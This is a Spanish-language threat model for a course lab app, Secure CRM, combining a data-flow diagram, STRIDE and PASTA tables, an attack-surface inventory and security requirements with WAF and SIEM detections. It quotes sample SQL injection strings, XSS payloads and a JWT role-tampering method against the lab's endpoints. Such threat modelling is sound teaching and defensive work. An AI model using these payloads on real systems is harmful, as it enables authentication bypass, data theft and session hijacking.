# Hito 1 · Diseño seguro (Secure SDLC + PASTA + STRIDE)

## Integrantes y roles

| Nombre | Usuario GitHub | Rol |
|---|---|---|
| **Fabiola Contreras** | [@Fabiola-cc](https://github.com/Fabiola-cc) | Equipo rojo (Red Team) |
| **María José Villafuerte** | [@Maria-Villafuerte](https://github.com/Maria-Villafuerte) | Equipo rojo (Red Team) |
| **Andree Toledo** | [@andreetoledo](https://github.com/andreetoledo) | Equipo azul (Blue Team) |
| **Sofía Velásquez** | [@Sofiamishel2003](https://github.com/Sofiamishel2003) | Equipo azul (Blue Team) |

---

## 1. Diagrama de Flujo de Datos (DFD) con Límites de Confianza

El siguiente Diagrama de Flujo de Datos (DFD Nivel 1) modela la arquitectura completa de **Secure CRM** integrada con el proxy inverso **WAF (ModSecurity + OWASP CRS)** y el **SIEM (Filebeat + Elasticsearch + Kibana)**, demarcando los cuatro **Límites de Confianza (*Trust Boundaries*, `TB-1` a `TB-4`)**:

![Diagrama de Flujo de Datos (DFD) de Secure CRM con Límites de Confianza](dfd.png)

```mermaid
flowchart LR
  subgraph TB1["TB-1: Zona No Confiable (Cliente / Red Externa)"]
    EE1["[EE-1] Usuario / Navegador\n(Roles: admin, agent, viewer)"]
    EE2["[EE-2] Atacante / Red Team\n(OWASP ZAP, Burp Suite, Postman)"]
  end

  subgraph TB2["TB-2: Perímetro DMZ / WAF (localhost:8080)"]
    P1(["(P-1) WAF Reverse Proxy\nnginx + ModSecurity + OWASP CRS\nModo: DetectionOnly / On"])
  end

  subgraph TB3["TB-3: Red Interna de Aplicación (Secure CRM)"]
    P2(["(P-2) Frontend Web\nNext.js 14 (:3000)\nNEXT_PUBLIC_API_URL=:8080"])
    P3(["(P-3) Backend API REST\nExpress + TypeScript (:4000)\nAuth JWT, Tickets, Users"])
    DS1[("DS-1: Base de Datos SQLite\napps/api/data/crm.db\nTablas: users, tickets")]
  end

  subgraph TB4["TB-4: Red de Monitoreo SIEM (Blue Team)"]
    P4(["(P-4) Agente Filebeat\nIngesta access.log y modsec_audit.json"])
    DS2[("DS-2: Elasticsearch (:9200)\nÍndice: filebeat-*")]
    P5(["(P-5) Kibana SIEM (:5601)\nDiscover (DET-*) & Dashboard WAF"])
  end

  EE1 -->|"DF-1: HTTP GET :3000 (Interfaz Web)"| P2
  EE1 -->|"DF-2: Peticiones API (:8080) con JWT/Cookie"| P1
  EE2 -->|"DF-3: Tráfico Ofensivo / PoC (:8080)\nSQLi, XSS, IDOR, DELETE"| P1
  P1 -->|"DF-4: Proxy Pass HTTP\nhost.docker.internal:4000"| P3
  P3 <-->|"DF-5: Consultas SQL\n(better-sqlite3)"| DS1
  P1 -.->|"DF-6: Volumen compartido waf-logs\n(modsec_audit.json / access.log)"| P4
  P4 -->|"DF-7: Indexación JSON (:9200)"| DS2
  DS2 <-->|"DF-8: Consultas KQL / ES|QL"| P5
  EE2 -.->|"DF-9 [HALLAZGO BYPASS]: Acceso directo a :4000\n(Salta TB-2 WAF en Opción A)"| P3
```

### Elementos y Límites de Confianza del DFD

| Código | Tipo | Componente | Descripción y Límite de Confianza |
|---|---|---|---|
| **TB-1** | Límite de Confianza | **Zona No Confiable (Cliente / Atacante)** | Entorno externo fuera del control del servidor (navegador web del usuario en `EE-1` y herramientas de ataque `ZAP`, `Burp Suite` y `Postman` del Red Team en `EE-2`). Ninguna entrada que cruce de `TB-1` hacia `TB-2` o `TB-3` es confiable. |
| **TB-2** | Límite de Confianza | **Perímetro DMZ / WAF (`localhost:8080`)** | Punto de inspección perimetral compuesto por **nginx + ModSecurity + OWASP Core Rule Set (CRS)** (`P-1`). Inspecciona cabeceras, query strings, métodos HTTP y cuerpos JSON antes de reenviar al backend. |
| **TB-3** | Límite de Confianza | **Red Interna de Aplicación (Secure CRM)** | Contiene el Frontend SSR/CSR en **Next.js 14** (`P-2`, puerto `3000`), la **API REST en Express + TypeScript** (`P-3`, puerto `4000`) y el almacén persistente **SQLite** (`DS-1`, `apps/api/data/crm.db`). |
| **TB-4** | Límite de Confianza | **Red de Monitoreo y Telemetría (SIEM)** | Plano de observabilidad exclusivo del **Blue Team**, integrado por **Filebeat** (`P-4`), **Elasticsearch** (`DS-2`, `:9200`) y **Kibana** (`P-5`, `:5601`), donde se almacenan los registros de auditoría del WAF (`modsec_audit.json`). |

---

## 2. Modelado de Amenazas con STRIDE

Cada categoría de **STRIDE** se aterriza sobre los componentes y archivos reales de **Secure CRM**:

| Letra | Categoría STRIDE | Amenaza Específica en Secure CRM | Componente Afectado (DFD / Código) | Control de Seguridad (Preventivo y Detectivo) |
|---|---|---|---|---|
| **S** | **Suplantación** (*Spoofing*) | **1)** Bypass de autenticación mediante Inyección SQL (`' OR '1'='1' --`) en el formulario de login.<br>**2)** Falsificación de sesión mediante tokens JWT alterados cuya firma criptográfica no es verificada por el servidor. | `P-3: Backend API`<br>- `apps/api/src/auth.ts` (`POST /api/auth/login`)<br>- `apps/api/src/middleware/auth.ts` (`jwt.decode()`) | **Código (H4):** Consultas preparadas parametrizadas (`?`) en SQLite y validación estricta `jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })`.<br>**SIEM/WAF (H3):** Regla `DET-01` en Kibana y bloqueo CRS `942*` (SQLi) en modo `On`. |
| **T** | **Manipulación** (*Tampering*) | **1)** Inyección de scripts maliciosos (**XSS Almacenado y Reflejado**) en los campos `title`, `description` y `customerEmail` al crear o editar tickets.<br>**2)** Escalada de privilegios por *Mass Assignment* o manipulación de roles en `/api/users`. | `P-2: Frontend Web` y `P-3: Backend API`<br>- `apps/api/src/routes/tickets.ts`<br>- `apps/web/app/tickets/[id]/page.tsx` (`dangerouslySetInnerHTML`) | **Código (H4):** Eliminación de `dangerouslySetInnerHTML`, sanitización de entradas/salidas y cabeceras `Content-Security-Policy` (CSP).<br>**SIEM/WAF (H3):** Regla `DET-02` en Kibana y bloqueo CRS `941*` (XSS) en modo `On`. |
| **R** | **Repudio** (*Repudiation*) | Ejecución de acciones destructivas (eliminación de tickets con `DELETE /api/tickets/:id`, cambios de rol o intentos de acceso ilegítimos) sin trazabilidad de auditoría en la base de datos de la aplicación ni correlación de IP. | `P-3: Backend API` y `P-1: WAF`<br>- `apps/api/src/routes/tickets.ts`<br>- `apps/api/src/routes/users.ts` | **SIEM (H3):** Centralización inmutable de `access.log` y `modsec_audit.json` vía Filebeat hacia Elasticsearch (`filebeat-*`), registrando `@timestamp`, `client_ip`, `uri`, método y payload; regla `DET-03` (`911100`). |
| **I** | **Divulgación de información** (*Information Disclosure*) | **1)** Extracción masiva de tickets de otros clientes vía SQLi en `GET /api/tickets?q=` o **IDOR** en `GET /api/tickets/:id`.<br>**2)** Exposición de hashes de contraseña débiles (**MD5 sin salt**) en `GET /api/users` y fuga de *stack traces* / cabecera `X-Powered-By`. | `P-3: Backend API` y `DS-1: SQLite`<br>- `apps/api/src/routes/tickets.ts`<br>- `apps/api/src/routes/users.ts`<br>- `apps/api/src/hash.ts` (`md5`)<br>- `apps/api/src/index.ts` | **Pipeline (H2):** SAST Semgrep (`md5-used-as-password`) y DAST ZAP (`X-Powered-By`).<br>**Código (H4):** Hashing con `PBKDF2-SHA512 + salt`, omisión de `password_hash` en respuestas JSON, control de acceso por propietario/rol y ocultamiento de errores 500. |
| **D** | **Denegación de servicio** (*Denial of Service*) | **1)** Ráfagas automatizadas de fuerza bruta y escaneo agresivo contra `POST /api/auth/login` y `/api/tickets` (ausencia de *Rate Limiting*).<br>**2)** Explotación de dependencias vulnerables a DoS/ReDoS (`qs`, `braces`, `postcss`). | `P-1: WAF` y `P-3: Backend API`<br>- `apps/api/src/auth.ts`<br>- Árbol de dependencias `pnpm-lock.yaml` | **Pipeline (H2):** SCA `pnpm audit` para detectar CVEs de DoS en dependencias.<br>**SIEM (H3):** Consulta ES\|QL de detección de ráfagas por IP (`COUNT(*) > 20` por minuto) en Kibana y contención en WAF. |
| **E** | **Elevación de privilegios** (*Elevation of Privilege*) | **1)** Un usuario con rol `viewer` o `agent` modifica el payload de su JWT (`"role": "admin"`) o invoca endpoints administrativos (`GET/POST /api/users`, `DELETE /api/tickets/:id`) sin control RBAC en el servidor.<br>**2)** Ejecución de contenedores Docker como `root` (UID 0). | `P-3: Backend API` y Contenedores<br>- `apps/api/src/middleware/auth.ts`<br>- `apps/api/src/routes/users.ts`<br>- `apps/api/Dockerfile`, `apps/web/Dockerfile` | **Pipeline (H2):** SAST Semgrep (`dockerfile.security.missing-user`).<br>**Código (H4):** Middleware `requireRole('admin')` con verificación criptográfica de JWT y directiva `USER node` en Dockerfiles. |

### Matriz STRIDE por Componente del DFD

La tabla anterior organiza STRIDE por categoría. Esta segunda vista recorre **cada componente del DFD** (procesos `P-*` y almacenes `DS-*`) y le asigna al menos una amenaza STRIDE aplicable con su control, para no dejar ningún elemento del diagrama sin analizar:

| Componente del DFD | Límite | Letra(s) STRIDE aplicable(s) | Amenaza concreta en ese componente | Control por componente |
|---|---|---|---|---|
| **P-1 · WAF (ModSecurity + CRS, `:8080`)** | TB-2 | **R, D, E** | **R/E:** evasión del WAF atacando directamente `:4000` (`DF-9`), sin registro en `modsec_audit.json`. **D:** ráfagas/escaneo que saturan la inspección. | Opción B de despliegue (ocultar `:4000` en la red Docker); `MODSEC_RULE_ENGINE=On`; logging de auditoría hacia el SIEM; `BLOCKING_PARANOIA` ajustable. |
| **P-2 · Frontend Next.js (`:3000`)** | TB-3 | **T, I** | **T/I:** XSS reflejado (término `?q=`) y almacenado (descripción) renderizados con `dangerouslySetInnerHTML` ([`tickets/page.tsx:69`](../../apps/web/app/tickets/page.tsx#L69), [`tickets/[id]/page.tsx:93`](../../apps/web/app/tickets/[id]/page.tsx#L93)); fuga de la cookie `session` sin `HttpOnly`. | Eliminar `dangerouslySetInnerHTML`/escapar salida; cabecera `Content-Security-Policy`; cookie `HttpOnly`+`Secure`+`SameSite`. |
| **P-3 · Backend API Express (`:4000`)** | TB-3 | **S, T, R, I, E** | **S:** SQLi en login y JWT sin verificar firma. **T/E:** mass assignment de `role` y falta de RBAC. **I:** fuga de hashes y stack traces. **R:** acciones destructivas sin auditoría propia. | Consultas parametrizadas; `jwt.verify()`; `requireRole`; lista blanca de campos; ocultar errores 500; `helmet`; registrar eventos de seguridad hacia el SIEM. |
| **DS-1 · SQLite (`crm.db`)** | TB-3 | **I, T** | **I:** volcado de `users`/`tickets` vía SQLi. **T:** modificación/borrado de registros sin control de acceso. | Consultas parametrizadas; principio de mínimo privilegio en el acceso a datos; hashing fuerte (PBKDF2/argon2) de `password_hash`. |
| **P-4 · Filebeat** | TB-4 | **T, I** | **T:** manipulación de los logs en tránsito o del archivo de auditoría. **I:** los logs pueden contener cuerpos de peticiones con credenciales de prueba. | Volumen de solo lectura hacia los logs; red SIEM aislada; no registrar secretos (CWE-532); en producción, canal cifrado a Elasticsearch. |
| **DS-2 · Elasticsearch (`:9200`)** | TB-4 | **I, D, S** | **I/S:** seguridad de Elastic deshabilitada en el laboratorio (acceso sin auth). **D:** saturación del índice `filebeat-*`. | Enlazado solo a `127.0.0.1`; en producción, habilitar `xpack.security`, autenticación y TLS; política de retención/ILM. |
| **P-5 · Kibana (`:5601`)** | TB-4 | **S, E** | **S/E:** acceso sin autenticación al SIEM permitiría leer o alterar tableros y reglas de detección. | Enlazado solo a `127.0.0.1`; en producción, autenticación y RBAC de Kibana; espacios y roles de solo lectura para el Blue Team. |

---

## 3. Metodología PASTA (Etapas 1 a 5)

### Etapa 1 · Objetivos del negocio (*Define Objectives*)
**Secure CRM** es la plataforma central de gestión de tickets de soporte al cliente y administración de agentes internos de la organización.
- **Objetivos de negocio y seguridad:**
  1. **Confidencialidad de la información de clientes y empleados:** Proteger los datos personales de clientes (correos, incidencias reportadas en tickets) y las credenciales de los usuarios internos (`admin`, `agent`, `viewer`).
  2. **Integridad operativa del flujo de soporte:** Garantizar que solo usuarios autenticados y con el rol autorizado puedan crear, modificar, reasignar o eliminar tickets y cuentas de usuario.
  3. **Disponibilidad y trazabilidad ante incidentes:** Mantener la continuidad del servicio de atención al cliente y asegurar que todo intento de ataque quede registrado en tiempo real en el SIEM para respuesta oportuna del Blue Team.
  4. **Cumplimiento en el ciclo de desarrollo (SSDLC):** Asegurar que ningún cambio de código o dependencia con vulnerabilidades críticas/altas llegue a producción sin pasar por controles automatizados (SAST, SCA, SBOM, DAST) y auditoría de código.

### Etapa 2 · Alcance técnico (*Define Technical Scope*)
El entorno técnico bajo análisis comprende los siguientes activos y tecnologías:
- **Repositorio y gestión de paquetes:** Monorepo gestionado con `pnpm@10.12.1` (`pnpm-workspace.yaml`, `pnpm-lock.yaml`) sobre **Node.js 20** (`node:20-bookworm`).
- **Frontend Web (`apps/web`):** Aplicación **Next.js 14.2.15** con React 18 y TailwindCSS, expuesta en `http://localhost:3000`, configurada mediante `NEXT_PUBLIC_API_URL=http://localhost:8080` para enrutar todo el tráfico de cliente a través del WAF.
- **Backend API REST (`apps/api`):** Servidor **Express 4.21** en TypeScript, escuchando en `http://localhost:4000`, con autenticación basada en **JWT** (`jsonwebtoken`) y cookies de sesión.
- **Base de Datos (`apps/api/data/crm.db`):** Motor relacional embebido **SQLite** accedido mediante el driver nativo síncrono `better-sqlite3`, con dos tablas principales: `users` y `tickets`.
- **Defensa Perimetral WAF (`waf-siem`):** Contenedor Docker `owasp/modsecurity-crs:nginx` expuesto en `http://127.0.0.1:8080`, operando con **ModSecurity v3** y **OWASP Core Rule Set (CRS)** (`BLOCKING_PARANOIA=1`), inicialmente en `MODSEC_RULE_ENGINE=DetectionOnly` (Hitos 0–2) y posteriormente en `MODSEC_RULE_ENGINE=On` (Hito 3).
- **Monitoreo SIEM (`waf-siem`):** Stack **Elastic 9.3.3** en Docker Compose conformado por **Filebeat** (ingesta de `/var/log/waf/access.log` y `/var/log/waf/modsec_audit.json`), **Elasticsearch** (`http://127.0.0.1:9200`) y **Kibana** (`http://127.0.0.1:5601`).

### Etapa 3 · Descomposición de la aplicación (*Application Decomposition*)
La aplicación se descompone en los siguientes módulos funcionales y flujos de confianza:
1. **Módulo de Autenticación y Sesión (`apps/api/src/auth.ts`, `hash.ts`, `middleware/auth.ts`):**
   - Recibe credenciales en `POST /api/auth/login`, calcula el hash de la contraseña con `weakHash()` ([`apps/api/src/hash.ts:6`](../../apps/api/src/hash.ts#L6), MD5 sin salt) y consulta la tabla `users`.
   - Emite un token JWT firmado con `JWT_SECRET` (`secret123`) y establece la cookie `session` en el navegador.
   - El middleware `requireAuth` intercepta las peticiones a rutas protegidas leyendo el encabezado `Authorization: Bearer <token>` o la cookie `session`.
2. **Módulo de Gestión de Tickets (`apps/api/src/routes/tickets.ts`):**
   - Permite listar y filtrar tickets (`GET /api/tickets?q=`), consultar el detalle de un ticket (`GET /api/tickets/:id`), crear tickets (`POST /api/tickets`), actualizarlos (`PUT /api/tickets/:id`) y eliminarlos (`DELETE /api/tickets/:id`).
3. **Módulo de Administración de Usuarios (`apps/api/src/routes/users.ts`):**
   - Gestiona el listado de usuarios (`GET /api/users`), detalle individual (`GET /api/users/:id`), creación de cuentas (`POST /api/users`) y actualización de roles (`PUT /api/users/:id/role`).
4. **Módulo de Métricas y Dashboard (`apps/api/src/routes/dashboard.ts`):**
   - Agrega estadísticas de tickets por estado (`open`, `in_progress`, `resolved`, `closed`) y prioridad (`low`, `medium`, `high`, `urgent`) en `GET /api/dashboard`.

### Etapa 4 · Análisis de amenazas (*Threat Analysis*)
A partir de la descomposición de componentes y el modelo STRIDE, se identifican los escenarios de amenaza prioritarios:
1. **Compromiso total de autenticación y extracción de base de datos vía Inyección SQL:** Un atacante externo envía metacaracteres SQL (`' OR '1'='1' --` o `UNION SELECT`) a través de `POST /api/auth/login` o `GET /api/tickets?q=` para autenticarse como `admin` sin conocer la contraseña o volcar registros confidenciales de `crm.db`.
2. **Secuestro de sesión y ejecución de código en el navegador de agentes/administradores vía XSS:** Un atacante inyecta payloads JavaScript (`<script>` o manejadores de eventos `<img src=x onerror=...>`) en la descripción de un ticket; cuando un administrador visualiza el ticket en Next.js (que usa `dangerouslySetInnerHTML`), el script se ejecuta en su contexto y roba la cookie `session` (que carece del atributo `HttpOnly`).
3. **Escalada vertical y horizontal de privilegios (JWT Forgery + IDOR + RBAC ausente):** Un usuario con rol básico (`viewer`) decodifica su JWT, cambia `"role": "viewer"` por `"role": "admin"` y lo reenvía; dado que el middleware usa `jwt.decode()` en lugar de `jwt.verify()`, el backend acepta el token alterado. Adicionalmente, cualquier usuario puede consultar tickets ajenos cambiando el `:id` en `/api/tickets/:id` (IDOR) o eliminar tickets con `DELETE`.
4. **Evasión del control perimetral WAF (*WAF Bypass*):** Dado que la aplicación se ejecuta en el host publicando el puerto `4000` (`Opción A`), un atacante con acceso a la red local puede dirigir sus peticiones directamente a `http://localhost:4000/api/*`, evitando por completo la inspección de ModSecurity y el registro en Kibana.

### Etapa 5 · Vulnerabilidades (*Vulnerability & Weakness Analysis*)
Integrando los hallazgos confirmados en el **Proyecto DAST y SAST/SCA** sobre **Secure CRM**, se consolida el inventario de vulnerabilidades presentes en la línea base:

| # | Hallazgo (del Proyecto DAST / SAST / SCA) | Clasificación OWASP Top 10:2025 / CWE | Dónde está (Archivo y Endpoint) | Relación con el DFD |
|---|---|---|---|---|
| **V-01** | **Inyección SQL (SQLi) en Login y Búsqueda de Tickets** | `A05:2025 Injection` · **CWE-89** | `apps/api/src/auth.ts` (`POST /api/auth/login`) y `apps/api/src/routes/tickets.ts` (`GET /api/tickets?q=`) | Flujos `DF-2`, `DF-3`, `DF-4` y `DF-5` (`EE-2` → `P-1` → `P-3` → `DS-1`). Concatenación directa de strings en `db.prepare()`. |
| **V-02** | **Cross-Site Scripting (XSS) Almacenado y Reflejado en Tickets** | `A05:2025 Injection` · **CWE-79** | `apps/api/src/routes/tickets.ts` (`POST/PUT /api/tickets`) y `apps/web/app/tickets/[id]/page.tsx` | Flujos `DF-3` → `P-3` → `DS-1` y renderizado sin escape en `P-2` (`dangerouslySetInnerHTML`) hacia `EE-1` (`DF-1`). |
| **V-03** | **Control de Acceso Roto (IDOR y falta de RBAC en rutas)** | `A01:2025 Broken Access Control` · **CWE-639 / CWE-862** | `apps/api/src/routes/tickets.ts` (`GET/DELETE /api/tickets/:id`) y `apps/api/src/routes/users.ts` | Flujos `DF-2` y `DF-4` hacia `P-3`. No se valida propiedad del ticket ni rol administrativo en mutaciones/bajas. |
| **V-04** | **Token JWT aceptado sin verificar la firma criptográfica** | `A07:2025 Authentication Failures` · **CWE-347** | `apps/api/src/middleware/auth.ts` (uso de `jwt.decode()` en vez de `jwt.verify()`) | Cruce de límite `TB-1`/`TB-2` hacia `P-3` (`DF-2`, `DF-4`). Permite forjar cualquier identidad o rol en el payload JWT. |
| **V-05** | **Exposición de hashes de contraseña con algoritmo débil (MD5 sin salt)** | `A04:2025 Cryptographic Failures` · **CWE-327 / CWE-759** | `apps/api/src/hash.ts` (`crypto.createHash('md5')`) y `apps/api/src/routes/users.ts` (`GET /api/users`) | Almacén `DS-1` (`users.password_hash`) y exposición en respuestas JSON de `P-3`. Detectado también por Semgrep SAST. |
| **V-06** | **Cabeceras de seguridad ausentes (CSP, X-Frame-Options) y Cookie sin `HttpOnly`** | `A02:2025 Security Misconfiguration` · **CWE-693 / CWE-1004 / CWE-1021** | `apps/api/src/auth.ts` (`res.cookie('session', ...)`), `apps/api/src/index.ts` y `apps/web/next.config.mjs` | Respuestas HTTP de `P-2` (`DF-1`) y `P-3` (`DF-2`). Detectado por el escaneo DAST de OWASP ZAP. |
| **V-07** | **CORS permisivo con credenciales y exposición de Stack Traces / `X-Powered-By`** | `A02:2025 Security Misconfiguration` · **CWE-942 / CWE-209 / CWE-200** | `apps/api/src/index.ts` (`cors({ origin: true, credentials: true })` y manejador de errores 500) | Configuración del proceso `P-3` en el límite `TB-3`. Filtra rutas internas del contenedor y permite peticiones cross-origin. |
| **V-08** | **Escalada de privilegios por Mass Assignment y ausencia de Rate Limiting en Login** | `A08:2025 Data Integrity Failures` / `A07:2025` · **CWE-915 / CWE-307** | `apps/api/src/routes/users.ts` (`POST /api/users`) y `apps/api/src/auth.ts` (`POST /api/auth/login`) | Flujos `DF-2` y `DF-3` hacia `P-3`. Permite crear usuarios con rol arbitrario y realizar fuerza bruta ilimitada. |
| **V-09** | **Dependencias de producción con CVEs conocidos y políticas de Supply Chain ausentes** | `A03:2025 Software Supply Chain Failures` · **CWE-1395** | `package.json`, `pnpm-lock.yaml`, `pnpm-workspace.yaml` (`lodash`, `jsonwebtoken`, `qs`, `proxy-addr`, `next`) | Construcción y ejecución de `P-2` y `P-3` en `TB-3`. Detectado por SCA (`pnpm audit`) y Semgrep Supply Chain. |
| **V-10** | **Contenedores Docker ejecutándose como `root` y Bypass del WAF por puerto `:4000` expuesto** | `A02:2025 Security Misconfiguration` · **CWE-250 / CWE-284** | `apps/api/Dockerfile`, `apps/web/Dockerfile` y publicación de `4000:4000` en `docker-compose.yml` (Opción A) | Flujo `DF-9` en el DFD: un cliente local puede conectarse a `http://localhost:4000` saltándose el límite `TB-2` (`P-1: WAF`). |

---

## 4. Superficie de Ataque (Reconocimiento Red Team y Arquitectura)

![Mapa de la Superficie de Ataque de Secure CRM](superficie.png)

### Inventario de Rutas, Métodos, Roles y Vectores de Explotación

> **Nota de cobertura del WAF.** La tabla lista la ruta **a través del WAF (`:8080`)**, que es por donde se ejecutan las pruebas según las reglas de enfrentamiento. Pero en el despliegue local (Opción A) **la UI (`http://localhost:3000`) y la API (`http://localhost:4000`) responden directamente, sin pasar por el WAF**: cada fila tiene por tanto un camino `:8080` (inspeccionado, columna "¿Pasa por el WAF?" = Sí) y un camino directo `:4000`/`:3000` (no inspeccionado) que constituye el bypass `DF-9` / `CA-05` / `V-10`.

| Método | Ruta (a través del WAF `:8080`) | ¿Pasa por el WAF? | Autenticación / Rol Esperado | Parámetros / Cuerpo de Entrada | Hallazgos del DAST Asociados y Uso como PoC en Hito 2 |
|---|---|---|---|---|---|
| `GET` | `/api/health` | Sí por `:8080` / **No** por `:4000` | Público | Ninguno | Verificación de disponibilidad a través del WAF (`:8080`) y prueba de **Bypass directo en `:4000`**. |
| `POST` | `/api/auth/login` | Sí por `:8080` / **No** por `:4000` | Público | JSON: `{ "username", "password" }` | **[PoC-01 · SQLi]** Bypass de login con `' OR '1'='1' --` (CWE-89). También vulnerable a fuerza bruta (CWE-307) y emite cookie `session` sin `HttpOnly` (CWE-1004). |
| `GET` | `/api/dashboard` | Sí por `:8080` / **No** por `:4000` | JWT (`viewer`, `agent`, `admin`) | Header `Authorization` / Cookie `session` | Acepta tokens JWT con firma inválida por uso de `jwt.decode()` (CWE-347). |
| `GET` | `/api/tickets` | Sí por `:8080` / **No** por `:4000` | JWT (`viewer`, `agent`, `admin`) | Query param `?q=<texto>` | **[PoC-02 · XSS reflejado / SQLi]** El filtro `?q=` se concatena en SQL (CWE-89) y se refleja sin escapar en el front (CWE-79). |
| `GET` | `/api/tickets/:id` | Sí por `:8080` / **No** por `:4000` | JWT (`viewer`, `agent`, `admin`) | Path param `:id` | **[PoC-03 · IDOR]** Permite a cualquier usuario autenticado leer tickets confidenciales de otros usuarios/clientes (CWE-639). |
| `POST` | `/api/tickets` | Sí por `:8080` / **No** por `:4000` | JWT (`agent`, `admin`) | JSON: `{ "title", "description", "priority", "customerEmail" }` | **[PoC-02 · XSS Almacenado]** Almacena payloads HTML/JS (`<script>`, `<img onerror>`) sin sanitizar (CWE-79), que luego se ejecutan en el navegador vía `dangerouslySetInnerHTML`. |
| `PUT` | `/api/tickets/:id` | Sí por `:8080` / **No** por `:4000` | JWT (`agent`, `admin`) | JSON: `{ "title", "description", "status", "priority", "assignedTo" }` | Vulnerable a XSS Almacenado (CWE-79) y modificación sin validar pertenencia del ticket. En modo `On` del WAF dispara la regla CRS `911100` si `PUT` no está en `ALLOWED_METHODS`. |
| `DELETE` | `/api/tickets/:id` | Sí por `:8080` / **No** por `:4000` | JWT (`admin`) | Path param `:id` | **[PoC-03 · Broken Access Control / Método HTTP]** Permite borrar tickets sin validar rol `admin` en el backend (CWE-862) y dispara la regla CRS `911100` en el WAF (`DET-03`). |
| `GET` | `/api/users` | Sí por `:8080` / **No** por `:4000` | JWT (`admin`) | Header `Authorization` | **[PoC-04]** Expone la columna `password_hash` con hashes **MD5 sin salt** (CWE-327) y es accesible con un JWT de firma inválida porque usa `jwt.decode()` (CWE-347); no comprueba rol. |
| `POST` | `/api/users` | Sí por `:8080` / **No** por `:4000` | JWT (`admin`) | JSON: `{ "username", "email", "password", "role" }` | Vulnerable a *Mass Assignment* de rol (CWE-915) y almacenamiento de contraseña en MD5 (CWE-327). |
| `PUT` | `/api/users/:id/role` | Sí por `:8080` / **No** por `:4000` | JWT (`admin`) | JSON: `{ "role" }` | Escalada de privilegios si se combina con un JWT manipulado (CWE-347 / CWE-862). |

> **Hallazgo de Bypass del WAF documentado (Opción A):**
> Al ejecutar la aplicación con su puerto original publicado en el host (`http://localhost:4000/api/health` responde `200 OK`), existe un camino directo (`DF-9` en el DFD) que permite evadir el límite de confianza `TB-2` (WAF ModSecurity en `:8080`). Durante todo el proyecto, las pruebas ofensivas y defensivas se ejecutan a través de `http://localhost:8080` según las reglas de enfrentamiento, y este bypass queda registrado como hallazgo arquitectónico (mitigable con la Opción B, ocultando el puerto `4000` dentro de la red interna de Docker Compose).

### Equivalencia de numeración entre Hito 1 y Hito 2

Los identificadores de vulnerabilidad de este Hito 1 (`V-*`), los casos de abuso (`CA-*`) y las fichas de PoC del [Hito 2](../hito-2/README.md) se corresponden así (la imagen `superficie.png` usa las etiquetas PoC de Hito 2):

| Hito 1 · Vulnerabilidad (`V-*`) | Hito 1 · Caso de abuso (`CA-*`) | Hito 2 · Ficha PoC | Tema |
|---|---|---|---|
| V-01 | CA-01 | **PoC-01** | SQLi en el login (CWE-89) |
| V-02 | CA-02 | **PoC-02** | XSS reflejado en búsqueda + almacenado en descripción (CWE-79) |
| V-03 | CA-03 | **PoC-03** | IDOR y DELETE sin control de acceso (CWE-639 / CWE-862) |
| V-04 + V-05 | CA-04 | **PoC-04** | JWT sin verificar firma (CWE-347) + fuga de hashes MD5 (CWE-327) |
| V-09 | CA-06 | *(control del pipeline)* | Supply chain / dependencias (CWE-1395) |
| V-06, V-07, V-08, V-10 | CA-05 (bypass) | *(soporte / contexto)* | Misconfig, CORS, mass assignment, bypass del WAF |

---

## 5. Requisitos de Seguridad y Controles de Verificación (Equipo Azul)

La siguiente matriz vincula cada **Requisito de Seguridad (`RS-01` a `RS-08`)** con la amenaza que mitiga y el **control exacto que el Equipo Azul y el Pipeline utilizan para comprobarlo** en los Hitos 2, 3 y 4:

| ID | Requisito de Seguridad | Amenaza / Vulnerabilidad que cubre | Control que lo comprueba (Equipo Azul) | Cómo se comprueba después (Hito 2, Hito 3 y Hito 4) |
|---|---|---|---|---|
| **RS-01** | **Prevención y bloqueo de Inyección SQL:** Toda consulta a SQLite debe usar sentencias preparadas parametrizadas (`?`) y el perímetro debe detectar y bloquear patrones SQLi en URL y cuerpo JSON. | **S / I** · Bypass de login y extracción de datos por SQLi (`CWE-89`, `V-01`). | **SIEM Kibana (`DET-01`) + WAF (`CRS 942*`) + Código (`H4`)** | **H3:** En Kibana, la búsqueda guardada `DET-01 SQLi` (`ruleId : 942*`) alerta el PoC del Red Team; al pasar el WAF a `MODSEC_RULE_ENGINE=On`, la petición recibe `HTTP 403`.<br>**H4:** En `DetectionOnly`, el PoC falla en la app gracias a los parámetros `?` y pasa el test `sql-injection.test.mjs`. |
| **RS-02** | **Neutralización de Cross-Site Scripting (XSS) y cabeceras de defensa en profundidad:** La aplicación no debe renderizar HTML crudo no confiable (`dangerouslySetInnerHTML`), debe definir `Content-Security-Policy` / `X-Frame-Options` y el WAF debe filtrar vectores XSS. | **T** · Ejecución de scripts maliciosos en el navegador (`CWE-79`, `CWE-693`, `V-02`, `V-06`). | **Pipeline (`DAST ZAP`) + SIEM Kibana (`DET-02`) + WAF (`CRS 941*`)** | **H2:** El job `dast` (ZAP baseline) verifica las cabeceras CSP y Anti-clickjacking.<br>**H3:** La regla `DET-02 XSS` (`ruleId : 941*`) detecta el payload en Kibana y el WAF en modo `On` devuelve `HTTP 403`.<br>**H4:** El código escapa el contenido del ticket sin ejecutar JS. |
| **RS-03** | **Verificación criptográfica de JWT, cookies seguras y control de acceso basado en roles (RBAC):** El backend debe validar la firma del JWT con `jwt.verify()`, emitir cookies con `HttpOnly: true` y restringir endpoints administrativos y de otros usuarios según rol y propietario. | **S / E / I** · Falsificación de JWT (`CWE-347`), IDOR (`CWE-639`), falta de RBAC (`CWE-862`) y robo de cookie (`CWE-1004`). | **Código y Pruebas (`H4`) + SIEM/WAF (`DET-03` / `911100`)** | **H3:** La regla `DET-03` (`ruleId : 911100`) detecta invocaciones `DELETE` no permitidas por el CRS.<br>**H4:** Con el WAF en `DetectionOnly`, un token manipulado o un acceso no autorizado recibe `401/403` directamente desde Express (`access-control.test.mjs`). |
| **RS-04** | **Almacenamiento seguro de contraseñas sin exposición de hashes:** Las contraseñas deben derivarse con un algoritmo resistente con sal criptográfica (`PBKDF2-SHA512`) y nunca emplear `MD5` ni devolverse en endpoints de la API. | **I** · Hashes débiles `MD5` sin salt (`CWE-327`, `V-05`). | **Pipeline (`SAST Semgrep`)** | **H2:** El job `sast` de GitHub Actions con Semgrep detecta `javascript.lang.security.audit.md5-used-as-password` en `apps/api/src/hash.ts`.<br>**H4:** Tras reemplazar MD5 por PBKDF2, el job `sast` de Semgrep reporta `0` hallazgos en `hash.ts`. |
